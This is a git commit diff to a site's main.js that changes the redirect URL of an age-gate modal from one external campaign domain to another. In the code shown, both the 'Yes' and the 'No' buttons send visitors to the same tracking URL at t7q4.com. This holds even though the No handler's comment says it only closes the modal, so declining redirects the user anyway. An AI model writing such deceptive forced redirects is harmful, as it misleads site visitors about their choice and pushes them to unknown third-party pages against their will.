c8014d7d614df9685ebdc8c29099baac3f09abfd
bestoffro <janki2lalta@gmail.com>
2026-02-13 13:43:46 +0530

    Update main.js

--- assets/js/main.js
+++ assets/js/main.js
@@ -57,12 +57,12 @@ if(form){
   function closeGate(){ bd.style.display='none'; bd.remove(); }  
   // ✅ Redirect when "Yes" is clicked
   bd.querySelector('#age-yes').addEventListener('click', function(){
-    window.location.href = "http://garrix.site/?utm_campaign=MSV93fjJj8&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+    window.location.href = "http://t7q4.com/?utm_campaign=6yNTG4cVvY&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
   });
  
   // ✅ Just close modal when "No" is clicked
   bd.querySelector('#age-no').addEventListener('click', function(){
-    window.location.href = "http://garrix.site/?utm_campaign=MSV93fjJj8&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+    window.location.href = "http://t7q4.com/?utm_campaign=6yNTG4cVvY&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
   });
 })();
 
@@ -97,4 +97,5 @@ if(form){
   if(yes) yes.addEventListener('click',close);
   if(no) no.addEventListener('click',close);
 })();
+
 
